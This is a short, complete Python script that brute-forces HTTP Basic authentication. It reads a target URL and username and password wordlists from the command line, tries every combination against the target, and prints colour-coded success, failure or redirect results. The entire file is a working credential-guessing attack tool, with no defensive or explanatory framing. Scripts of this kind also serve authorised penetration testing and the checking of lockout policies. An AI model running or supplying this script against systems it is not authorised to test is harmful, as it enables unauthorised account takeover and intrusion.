import sys
import requests
import colorama

colorama.init()

invalid_codes = [401, 403, 404]
possible_codes = [301, 302]

target_url = sys.argv[1]
with open(sys.argv[2]) as f:
    usernames = f.read().split("\n")
with open(sys.argv[3]) as f:
    passwords = f.read().split("\n")

print("Starting the brute force...")

for username in usernames:
    for password in passwords:
        r = requests.get(target_url, auth=(username, password))
        if r.status_code == 200:
            print(f"{colorama.Fore.GREEN}SUCCESS! {username}:{password} {[r.status_code]}{colorama.Fore.RESET}")
        elif r.status_code in invalid_codes:
            print(f"{colorama.Fore.RED}FAILURE! {username}:{password} {[r.status_code]}{colorama.Fore.RESET}")
        elif r.status_code in possible_codes:
            print(f"{colorama.Fore.YELLOW}30X RETURNED, Verify Manually! {username}:{password} {[r.status_code]}{colorama.Fore.RESET}")

print('Done!')
